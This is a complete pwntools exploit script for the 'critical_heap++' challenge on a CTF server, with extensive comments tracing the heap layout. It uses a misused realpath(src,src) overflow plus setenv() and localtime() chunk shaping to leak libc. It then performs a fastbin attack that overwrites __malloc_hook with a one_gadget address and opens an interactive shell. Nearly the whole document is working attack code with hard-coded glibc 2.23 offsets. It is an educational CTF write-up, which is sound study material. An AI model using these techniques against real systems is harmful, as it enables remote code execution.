###Crazy heap exploit related to localtime(), setenv() and realpath()

from pwn import *

###Structures
'''
Normal block (0x48)
    |   4   |   4   |   4   |   4   |
0x00|  name(char*)  | inuse |   x   |
0x10|     type      |    content    |
0x20|    content    |    content    |
0x30|    content    |    content    |
0x40|   modified    |               

System block (0x48)
    |   4   |   4   |   4   |   4   |
0x00|  name(char*)  | inuse |   x   |
0x10|     type      | cur_dir(char*)|
0x20|  other(char*) |   usr(char*)  |
0x30|   sys(char*)  |    rand_num   |
0x40|       x       | 

Clock block (0x48)
    |   4   |   4   |   4   |   4   |
0x00|  name(char*)  | inuse |   x   |
0x10|     type      |   time(tm*)   |
0x20|  year | month |  day  |  hour |
0x30|  min  |  sec  |       x       |
0x40|       x       |
'''

###Utils
def create(htype,name,content=None):
    for i in range(10):
        if hdoc[i]=='':
            hdoc[i] = htype
            break
    if htype=='normal':
        htype = '1'
    elif htype=='clock':
        htype = '2'
    elif htype=='system':
        htype = '3'
    r.sendlineafter('choice : ','1')
    r.sendafter('heap:',name)
    r.sendlineafter('choice : ',htype)
    if htype=='1':
        r.sendafter('heap :',content)


def show(idx):
    r.sendlineafter('choice : ','2')
    r.sendlineafter('heap :',str(idx))
    return r.recvuntil('********')[:-9]

def rename(idx,name):
    r.sendlineafter('choice : ','3')
    r.sendlineafter('heap :',str(idx))
    r.sendafter('heap:',name)

def play_norm(mode,data=None):
    if mode=='show':
        mode = 1
    elif mode=='update':
        mode = 2
    r.sendlineafter('choice : ',str(mode))
    if mode==1:
        return r.recvuntil('********')[9:-9]
    elif mode==2:
        r.sendafter('Content :',data)
        return None

def play_clock(mode):
    if mode=='show':
        mode = 1
    elif mode=='update':
        mode = 2
    r.sendlineafter('choice : ',str(mode))
    if mode==1:
        return r.recvuntil('********')[:-9]
    elif mode==2:
        return None

def play_sys(mode,envname=None,envval=None):
    if mode=='set':
        mode = 1
    elif mode=='unset':
        mode = 2
    elif mode=='get_path':
        mode = 3
    elif mode=='get_val':
        mode = 4
    r.sendlineafter('choice : ',str(mode))
    if mode==1:
        r.sendlineafter('heap :',envname)
        r.sendlineafter('name :',envval)
        return None
    elif mode==2:
        r.sendlineafter('unset :',envname)
        return None
    elif mode==3:
        return None
    elif mode==4:
        r.sendlineafter('see :',envname)
        return None

def leave_play(idx):
    htype = hdoc[idx]
    if htype=='normal':
        r.sendlineafter('choice : ','3')
    elif htype=='clock':
        r.sendlineafter('choice : ','3')
    elif htype=='system':
        r.sendlineafter('choice : ','5')

def play(idx,mode,data=None,envname=None,envval=None):
    r.sendlineafter('choice : ','4')
    r.sendlineafter('heap :',str(idx))
    htype = hdoc[idx]
    if htype=='normal':
        ret = play_norm(mode,data)
    elif htype=='clock':
        ret = play_clock(mode)
    elif htype=='system':
        ret = play_sys(mode,envname,envval)
    leave_play(idx)
    return ret

def delete(idx):
    r.sendlineafter('choice : ','5')
    r.sendlineafter('heap :',str(idx))
    hdoc[idx] = ''

def leave():
    r.sendlineafter('choice : ','6')

def getshell():
    r.sendlineafter('choice : ','1')
    r.sendafter('heap:','a')

###Addr
#  libc2.23
malloc_hook_offset = 0x3c3b10
main_arena_offset = 0x3c3b20
unsorted_bin_offset = main_arena_offset+0x58
one_gadget = 0xf0567

###Exploit
###Idea
'''
The vulnerability in this program is realpath(&src,&src)
    when expanding path='.', getcwd will be called and dst will be changed, however, since src is changed too
    realpath will continue parsing the path and by appending an additional '/home' to the end of dst
    before realizing the path is unavailable and return NULL
    this causes the original message in src to extend by 5 chars

The correct way of using this function is specifying different buffers for src and dst, and this misconfiguration allows a buffer overflow

A simple coverage on the mechanisms in the problem
    Two possible free() are present, one is free(old_tz) and the other is realloc() in setenv()

The main idea of this exploit is 
    1. use setenv() to craft unsorted bin chunk
    2. utilize realpath() to extend size of unsorted bin chunk
    3. nudge unsorted bin chunk to overlap with existing names to leak libc addr
    4. create fastbin chunk using free(old_tz)
    5. use overlapping unsorted/fast bin chunk to perform fastbin attack
    6. hijack malloc_hook with one gadget and get shell

A complete walkthrough will be shown below

**  Noticebly, there are 26 environment variables on server, two more than specified in docker_compose.yml
    this is understandable since some env are related to remote connection ip and will only exist at runtime, but also annoying
    to acquire exact amout, try forcing a realloc with setenv() and monitor behaviour by leaking heap addr
    the technique will be shown in leakenv.py
    additionally, an easier way to leak libc_base is also included in leakenv.py
'''

###Initialize
hdoc = ['' for i in range(10)]
r = remote('chall.pwnable.tw',10500)

###Walkthrough
create('system','0')                #0
'''
heap
     |       8       |       8       |
0x000|               |           0x21| <- chunk0 name
                     .
0x020|               |           0x21| <- current_dir_name(chunk0) = /home/critical_heap++
                     .
0x040|               |        0x20ec1| <- top
'''

play(0,'set',envname='TZ',envval='a'*0x64)
'''
setenv() calls realloc() for a space equal to (env_cnt+2)*sizeof(char*) to place the environment variables
it also creates a new rbtree node with tsearch() for each environ created

heap
     |       8       |       8       |
0x000|               |           0x21| <- chunk0 name
                     .
0x020|               |           0x21| <- current_dir_name(chunk0) = /home/critical_heap++
                     .
0x040|               |           0xf1| <- environs
0x050|     env00     |     env01     |
                     .
0x110|     env24     |     env25     |
0x120|     envTZ     |               |
0x130|               |           0x71| <- TZ data
                     .
0x1a0|               |           0x31| <- environ rbtree node(TZ)
                     .
0x1d0|               |        0x20e31| <- top
'''

create('normal','1','a'*0x28)       #1
'''
heap
     |       8       |       8       |
0x000|               |           0x21| <- chunk0 name
                     .
0x020|               |           0x21| <- current_dir_name(chunk0) = /home/critical_heap++
                     .
0x040|               |           0xf1| <- environs
0x050|     env00     |     env01     |
                     .
0x110|     env24     |     env25     |
0x120|     envTZ     |               |
0x130|               |           0x71| <- TZ data
                     .
0x1a0|               |           0x31| <- environ rbtree node(TZ)
                     .
0x1d0|               |           0x21| <- chunk1 name
                     .
0x1f0|               |        0x20e11| <- top
'''

create('clock','2')                 #2
'''
localtime() calls tz_convert() and check the TZ environment for timezone data
a rough outline of stuff done here that is related to heap:
    tz_convert()
        tzset_internal()
            free(old_tz)  **does nothing here since old_tz is NULL
            old_tz = strdup(tz)
            tzfile_read()
                check and return if is setuid or setgid program
                asprint(&buf,"%s/%s",tzdir,file);
                    vfprintf_internal()  **performs array size doubling
                malloc(needed)  **malloc a block just big enough to accommodate data
                free(buf)
            fopen(tzdir/tz)  **fails here
            tzset_parse()

heap
     |       8       |       8       |
0x000|               |           0x21| <- chunk0 name
                     .
0x020|               |           0x21| <- current_dir_name(chunk0) = /home/critical_heap++
                     .
0x040|               |           0xf1| <- environs
0x050|     env00     |     env01     |
                     .
0x110|     env24     |     env25     |
0x120|     envTZ     |               |
0x130|               |           0x71| <- TZ data
                     .
0x1a0|               |           0x31| <- environ rbtree node(TZ)
                     .
0x1d0|               |           0x21| <- chunk1 name
                     .
0x1f0|               |           0x21| <- chunk2 name
                     .
0x210|               |           0x71| <- oldtz
                     .
0x280|               |           0x81| <- free chunk(fast 0x80)
                     .
0x300|               |        0x20d01| <- top
'''

play(0,'unset',envname='PWD')
'''
heap
     |       8       |       8       |
0x000|               |           0x21| <- chunk0 name
                     .
0x020|               |           0x21| <- current_dir_name(chunk0) = /home/critical_heap++
                     .
0x040|               |           0xf1| <- environs
0x050|     env00     |     env01     |
                     .
0x110|     env24     |     envTZ     |
0x120|               |               |
0x130|               |           0x71| <- TZ data
                     .
0x1a0|               |           0x31| <- environ rbtree node(TZ)
                     .
0x1d0|               |           0x21| <- chunk1 name
                     .
0x1f0|               |           0x21| <- chunk2 name
                     .
0x210|               |           0x71| <- oldtz
                     .
0x280|               |           0x81| <- free chunk(fast 0x80)
                     .
0x300|               |        0x20d01| <- top
'''

play(0,'set',envname='PWD',envval='.')
'''
heap
     |       8       |       8       |
0x000|               |           0x21| <- chunk0 name
                     .
0x020|               |           0x21| <- current_dir_name(chunk0) = /home/critical_heap++
                     .
0x040|               |           0xf1| <- environs
0x050|     env00     |     env01     |
                     .
0x110|     env24     |     envTZ     |
0x120|     envPWD    |               |
0x130|               |           0x71| <- TZ data
                     .
0x1a0|               |           0x31| <- environ rbtree node(TZ)
                     .
0x1d0|               |           0x21| <- chunk1 name
                     .
0x1f0|               |           0x21| <- chunk2 name
                     .
0x210|               |           0x71| <- oldtz
                     .
0x280|               |           0x81| <- free chunk(fast 0x80)
                     .
0x300|               |           0x21| <- PWD data
                     .
0x320|               |           0x31| <- environ rbtree node(PWD)
                     .
0x350|               |        0x20cb0| <- top
'''

play(0,'set',envname='A',envval='A')
'''
heap
     |       8       |       8       |
0x000|               |           0x21| <- chunk0 name
                     .
0x020|               |           0x21| <- current_dir_name(chunk0) = /home/critical_heap++
                     .
0x040|               |           0xf1| <- environs
0x050|     env00     |     env01     |
                     .
0x110|     env24     |     envTZ     |
0x120|     envPWD    |     envA      |
0x130|               |           0x71| <- TZ data
                     .
0x1a0|               |           0x31| <- environ rbtree node(TZ)
                     .
0x1d0|               |           0x21| <- chunk1 name
                     .
0x1f0|               |           0x21| <- chunk2 name
                     .
0x210|               |           0x71| <- oldtz
                     .
0x280|               |           0x81| <- free chunk(fast 0x80)
                     .
0x300|               |           0x21| <- PWD data
                     .
0x320|               |           0x31| <- environ rbtree node(PWD)
                     .
0x350|               |           0x21| <- A data
                     .
0x370|               |           0x31| <- environ rbtree node(A)
                     .
0x3a0|               |        0x20c60| <- top
'''

play(0,'set',envname='B',envval='B')
'''
realloc() frees old environ table since it demands space (env_cnt+2)*sizeof(char*)

heap
     |       8       |       8       |
0x000|               |           0x21| <- chunk0 name
                     .
0x020|               |           0x21| <- current_dir_name(chunk0) = /home/critical_heap++
                     .
0x040|               |           0x21| <- B data
                     .
0x060|               |           0x31| <- environ rbtree node(B)
                     .
0x090|               |           0xa1| <- free chunk(unsorted)
                     .
0x130|           0xa0|           0x70| <- TZ data
                     .
0x1a0|               |           0x31| <- environ rbtree node(TZ)
                     .
0x1d0|               |           0x21| <- chunk1 name
                     .
0x1f0|               |           0x21| <- chunk2 name
                     .
0x210|               |           0x71| <- oldtz
                     .
0x280|               |           0x81| <- free chunk(fast 0x80)
                     .
0x300|               |           0x21| <- PWD data
                     .
0x320|               |           0x31| <- environ rbtree node(PWD)
                     .
0x350|               |           0x21| <- A data
                     .
0x370|               |           0x31| <- environ rbtree node(A)
                     .
0x3a0|               |          0x101| <- environs
           env00     |     env01     |
                     .
0x480|     envPWD    |     envA      |
0x490|     envB      |               |
0x4a0|               |        0x20b60| <- top
'''

create('system','3')                #3
'''
heap
     |       8       |       8       |
0x000|               |           0x21| <- chunk0 name
                     .
0x020|               |           0x21| <- current_dir_name(chunk0) = /home/critical_heap++
                     .
0x040|               |           0x21| <- B data
                     .
0x060|               |           0x31| <- environ rbtree node(B)
                     .
0x090|               |           0x21| <- chunk3 name
                     .
0x0b0|               |           0x21| <- current_dir_name(chunk3) = .
                     .
0x0d0|               |           0x60| <- free chunk(unsorted)
                     .
0x130|           0x60|           0x70| <- TZ data
                     .
0x1a0|               |           0x31| <- environ rbtree node(TZ)
                     .
0x1d0|               |           0x21| <- chunk1 name
                     .
0x1f0|               |           0x21| <- chunk2 name
                     .
0x210|               |           0x71| <- oldtz
                     .
0x280|               |           0x81| <- free chunk(fast 0x80)
                     .
0x300|               |           0x21| <- PWD data
                     .
0x320|               |           0x31| <- environ rbtree node(PWD)
                     .
0x350|               |           0x21| <- A data
                     .
0x370|               |           0x31| <- environ rbtree node(A)
                     .
0x3a0|               |          0x101| <- environs
           env00     |     env01     |
                     .
0x480|     envPWD    |     envA      |
0x490|     envB      |               |
0x4a0|               |        0x20b60| <- top
'''

play(3,'get_path')
'''
realpath(src,src) will try to get canonical path name
however, having src_buf = dest_buf results in path unpack misbehaviour
causing path to be unpacked into /home/critical_heap++/home
this further laeds to an overflow into next chunk size and changes it into a large value

heap
     |       8       |       8       |
0x000|               |           0x21| <- chunk0 name
                     .
0x020|               |           0x21| <- current_dir_name(chunk0) = /home/critical_heap++
  .
0x040|               |           0x21| <- B data
                     .
0x060|               |           0x31| <- environ rbtree node(B)
                     .
0x090|               |           0x21| <- chunk3 name
                     .
0x0b0|               |           0x21| <- current_dir_name(chunk3) = /home/critical_heap++/home
                     .
0x0d0|               |         0x656d| <- free chunk(unsorted)
                     .
0x130|           0x60|           0x70| <- TZ data
                     .
0x1a0|               |           0x31| <- environ rbtree node(TZ)
                     .
0x1d0|               |           0x21| <- chunk1 name
                     .
0x1f0|               |           0x21| <- chunk2 name
                     .
0x210|               |           0x71| <- oldtz
                     .
0x280|               |           0x81| <- free chunk(fast 0x80)
                     .
0x300|               |           0x21| <- PWD data
                     .
0x320|               |           0x31| <- environ rbtree node(PWD)
                     .
0x350|               |           0x21| <- A data
                     .
0x370|               |           0x31| <- environ rbtree node(A)
                     .
0x3a0|               |          0x101| <- environs
           env00     |     env01     |
                     .
0x480|     envPWD    |     envA      |
0x490|     envB      |               |
0x4a0|               |        0x20b60| <- top
'''

play(0,'unset',envname='TZ')
'''
heap
     |       8       |       8       |
0x000|               |           0x21| <- chunk0 name
                     .
0x020|               |           0x21| <- current_dir_name(chunk0) = /home/critical_heap++
  .
0x040|               |           0x21| <- B data
                     .
0x060|               |           0x31| <- environ rbtree node(B)
                     .
0x090|               |           0x21| <- chunk3 name
                     .
0x0b0|               |           0x21| <- current_dir_name(chunk3) = /home/critical_heap++/home
                     .
0x0d0|               |         0x656d| <- free chunk(unsorted)
                     .
0x130|           0x60|           0x70| <- TZ data
                     .
0x1a0|               |           0x31| <- environ rbtree node(TZ)
                     .
0x1d0|               |           0x21| <- chunk1 name
                     .
0x1f0|               |           0x21| <- chunk2 name
                     .
0x210|               |           0x71| <- oldtz
                     .
0x280|               |           0x81| <- free chunk(fast 0x80)
                     .
0x300|               |           0x21| <- PWD data
                     .
0x320|               |           0x31| <- environ rbtree node(PWD)
                     .
0x350|               |           0x21| <- A data
                     .
0x370|               |           0x31| <- environ rbtree node(A)
                     .
0x3a0|               |          0x101| <- environs
           env00     |     env01     |
                     .
0x480|     envA      |     envB      |
0x490|               |               |
0x4a0|               |        0x20b60| <- top
'''

play(0,'set',envname='TZ',envval=':')
'''
we want a method to free old_tz later, but not change the heap too much
setting TZ to ':' helps achieve this

a rough outline of stuff done here that is related to heap:
    tz_convert()
        tzset_internal()
            free(old_tz)  **does nothing here since old_tz is NULL
            if tz==NULL : return
heap
     |       8       |       8       |
0x000|               |           0x21| <- chunk0 name
                     .
0x020|               |           0x21| <- current_dir_name(chunk0) = /home/critical_heap++
  .
0x040|               |           0x21| <- B data
                     .
0x060|               |           0x31| <- environ rbtree node(B)
                     .
0x090|               |           0x21| <- chunk3 name
                     .
0x0b0|               |           0x21| <- current_dir_name(chunk3) = /home/critical_heap++/home
                     .
0x0d0|               |           0x21| <- TZ data(new)
                     .
0x0f0|               |           0x31| <- environ rbtree node(TZ new)
                     .
0x120|               |         0x6519| <- free chunk(unsorted)
                     .
0x1a0|               |           0x31| <- environ rbtree node(TZ old)
                     .
0x1d0|               |           0x21| <- chunk1 name
                     .
0x1f0|               |           0x21| <- chunk2 name
                     .
0x210|               |           0x71| <- oldtz
                     .
0x280|               |           0x81| <- free chunk(fast 0x80)
                     .
0x300|               |           0x21| <- PWD data
                     .
0x320|               |           0x31| <- environ rbtree node(PWD)
                     .
0x350|               |           0x21| <- A data
                     .
0x370|               |           0x31| <- environ rbtree node(A)
                     .
0x3a0|               |          0x101| <- environs
           env00     |     env01     |
                     .
0x480|     envA      |     envB      |
0x490|     envTZ     |               |
0x4a0|               |        0x20b60| <- top
'''

create('normal','4'*0xa0,'a'*0x28)  #4
unsorted_bin_addr = u64(show(1).split(b'\n')[0][-6:]+b'\x00\x00')
libc_base = unsorted_bin_addr-unsorted_bin_offset
print(hex(unsorted_bin_addr))
print(hex(libc_base))
'''
overlap free unsorted chunk with chunk1 to leak libc_base

heap
     |       8       |       8       |
0x000|               |           0x21| <- chunk0 name
                     .
0x020|               |           0x21| <- current_dir_name(chunk0) = /home/critical_heap++
  .
0x040|               |           0x21| <- B data
                     .
0x060|               |           0x31| <- environ rbtree node(B)
                     .
0x090|               |           0x21| <- chunk3 name
                     .
0x0b0|               |           0x21| <- current_dir_name(chunk3) = /home/critical_heap++/home
                     .
0x0d0|               |           0x21| <- TZ data(new)
                     .
0x0f0|               |           0x31| <- environ rbtree node(TZ new)
                     .
0x120|               |           0xb1| <- chunk4 name
                     .
0x1d0|               |         0x6469| <- chunk1 name, free chunk(unsorted) !! overlap
0x1e0|  unsorted_bin |  unsorted_bin |
0x1f0|               |           0x00| <- chunk2 name                       !! cleared to zero because of large bin next/prev size
                     .
0x210|               |           0x71| <- oldtz
                     .
0x280|               |           0x81| <- free chunk(fast 0x80)
                     .
0x300|               |           0x21| <- PWD data
                     .
0x320|               |           0x31| <- environ rbtree node(PWD)
                     .
0x350|               |           0x21| <- A data
                     .
0x370|               |           0x31| <- environ rbtree node(A)
                     .
0x3a0|               |          0x101| <- environs
           env00     |     env01     |
                     .
0x480|     envA      |     envB      |
0x490|     envTZ     |               |
0x4a0|               |        0x20b60| <- top
'''

play(2,'update')
'''
free original old_tz

heap
     |       8       |       8       |
0x000|               |           0x21| <- chunk0 name
                     .
0x020|               |           0x21| <- current_dir_name(chunk0) = /home/critical_heap++
  .
0x040|               |           0x21| <- B data
                     .
0x060|               |           0x31| <- environ rbtree node(B)
                     .
0x090|               |           0x21| <- chunk3 name
                     .
0x0b0|               |           0x21| <- current_dir_name(chunk3) = /home/critical_heap++/home
                     .
0x0d0|               |           0x21| <- TZ data(new)
                     .
0x0f0|               |           0x31| <- environ rbtree node(TZ new)
                     .
0x120|               |           0xb1| <- chunk4 name
                     .
0x1d0|               |           0x21| <- chunk1 name, old_tz(new)                  !! overlap
                     .
0x1f0|               |         0x6449| <- chunk2 name, free chunk(unsorted)         !! overlap
0x200| unsorted_bin  | unsorted_bin  |
0x210|               |           0x00| <- free chunk(fast 0x70) (original old_tz)   !! cleared to zero because of large bin next/prev size
                     .
0x280|               |           0x81| <- free chunk(fast 0x80)
                     .
0x300|               |           0x21| <- PWD data
                     .
0x320|               |           0x31| <- environ rbtree node(PWD)
                     .
0x350|               |           0x21| <- A data
                     .
0x370|               |           0x31| <- environ rbtree node(A)
                     .
0x3a0|               |          0x101| <- environs
           env00     |     env01     |
                     .
0x480|     envA      |     envB      |
0x490|     envTZ     |               |
0x4a0|               |        0x20b60| <- top
'''

create('normal',b'5'*0x87,'a'*0x28) #5
'''
heap
     |       8       |       8       |
0x000|               |           0x21| <- chunk0 name
                     .
0x020|               |           0x21| <- current_dir_name(chunk0) = /home/critical_heap++
  .
0x040|               |           0x21| <- B data
                     .
0x060|               |           0x31| <- environ rbtree node(B)
                     .
0x090|               |           0x21| <- chunk3 name
                     .
0x0b0|               |           0x21| <- current_dir_name(chunk3) = /home/critical_heap++/home
                     .
0x0d0|               |           0x21| <- TZ data(new)
                     .
0x0f0|               |           0x31| <- environ rbtree node(TZ new)
                     .
0x120|               |           0xb1| <- chunk4 name
                     .
0x1d0|               |           0x21| <- chunk1 name, old_tz(new)              !! overlap
                     .
0x1f0|               |           0x91| <- chunk2 name, chunk5 name              !! overlap
                     .
0x210|               |        garbage| <- free chunk(fast 0x70)
                     .
0x280|               |         0x63b9| <- free chunk(fast 0x80,unsorted)        !! overlap
                     .
0x300|               |           0x21| <- PWD data
                     .
0x320|               |           0x31| <- environ rbtree node(PWD)
                     .
0x350|               |           0x21| <- A data
                     .
0x370|               |           0x31| <- environ rbtree node(A)
                     .
0x3a0|               |          0x101| <- environs
           env00     |     env01     |
                     .
0x480|     envA      |     envB      |
0x490|     envTZ     |               |
0x4a0|               |        0x20b60| <- top
'''

rename(5,p64(0)*3+p64(0x71)+p64(libc_base+malloc_hook_offset-0x23))
'''
heap
     |       8       |       8       |
0x000|               |           0x21| <- chunk0 name
                     .
0x020|               |           0x21| <- current_dir_name(chunk0) = /home/critical_heap++
  .
0x040|               |           0x21| <- B data
                     .
0x060|               |           0x31| <- environ rbtree node(B)
                     .
0x090|               |           0x21| <- chunk3 name
                     .
0x0b0|               |           0x21| <- current_dir_name(chunk3) = /home/critical_heap++/home
                     .
0x0d0|               |           0x21| <- TZ data(new)
                     .
0x0f0|               |           0x31| <- environ rbtree node(TZ new)
                     .
0x120|               |           0xb1| <- chunk4 name
                     .
0x1d0|               |           0x21| <- chunk1 name, old_tz(new)          !! overlap
                     .
0x1f0|               |           0x91| <- chunk2 name, chunk5 name          !! overlap
                     .
0x210|               |           0x71| <- free chunk(fast 0x70)
0x220|malloc_hook_blk|               |
                     .
0x280|               |         0x63b9| <- free chunk(fast 0x80,unsorted)    !! overlap
                     .
0x300|               |           0x21| <- PWD data
                     .
0x320|               |           0x31| <- environ rbtree node(PWD)
                     .
0x350|               |           0x21| <- A data
                     .
0x370|               |           0x31| <- environ rbtree node(A)
                     .
0x3a0|               |          0x101| <- environs
           env00     |     env01     |
                     .
0x480|     envA      |     envB      |
0x490|     envTZ     |               |
0x4a0|               |        0x20b60| <- top
'''

create('normal',b'6'*0x67,'a'*0x28) #6
'''
fastbin[0x70] -> malloc_hook_blk

heap
     |       8       |       8       |
0x000|               |           0x21| <- chunk0 name
                     .
0x020|               |           0x21| <- current_dir_name(chunk0) = /home/critical_heap++
  .
0x040|               |           0x21| <- B data
                     .
0x060|               |           0x31| <- environ rbtree node(B)
                     .
0x090|               |           0x21| <- chunk3 name
                     .
0x0b0|               |           0x21| <- current_dir_name(chunk3) = /home/critical_heap++/home
                     .
0x0d0|               |           0x21| <- TZ data(new)
                     .
0x0f0|               |           0x31| <- environ rbtree node(TZ new)
                     .
0x120|               |           0xb1| <- chunk4 name
                     .
0x1d0|               |           0x21| <- chunk1 name, old_tz(new)          !! overlap
                     .
0x1f0|               |           0x91| <- chunk2 name, chunk5 name          !! overlap
                     .
0x210|               |           0x71| <- free chunk(fast 0x70)
0x220|malloc_hook_blk|               |
                     .
0x280|               |         0x63b9| <- free chunk(fast 0x80,unsorted)    !! overlap
                     .
0x300|               |           0x21| <- PWD data
                     .
0x320|               |           0x31| <- environ rbtree node(PWD)
                     .
0x350|               |           0x21| <- A data
                     .
0x370|               |           0x31| <- environ rbtree node(A)
                     .
0x3a0|               |          0x101| <- environs
           env00     |     env01     |
                     .
0x480|     envA      |     envB      |
0x490|     envTZ     |               |
0x4a0|               |        0x20b60| <- top
'''

create('normal',b'7'*0x67,'a'*0x28) #7
rename(7,b'\x00'*0x13+p64(libc_base+one_gadget))
'''
malloc_hook = one_gadget
'''

getshell()
r.interactive()

###Reference
#  setenv / unsetenv
#    https://code.woboq.org/userspace/glibc/stdlib/setenv.c.html
#  tsearch
#    https://code.woboq.org/userspace/glibc/misc/tsearch.c.html
#  localtime
#    https://code.woboq.org/userspace/glibc/time/localtime.c.html
#  tz_convert, tzset_internal, tzfile_read
#    https://code.woboq.org/userspace/glibc/time/tzset.c.html
#  asprintf
#    https://code.woboq.org/userspace/glibc/stdio-common/asprintf.c.html
#  vasprintf
#    https://code.woboq.org/userspace/glibc/libio/vasprintf.c.html
#  get_current_dir_name
#    https://code.woboq.org/userspace/glibc/io/getdirname.c.html
#  realpath
#    https://code.woboq.org/userspace/glibc/stdlib/canonicalize.c.html
#  getcwd
#    https://code.woboq.org/userspace/glibc/sysdeps/posix/getcwd.c.html
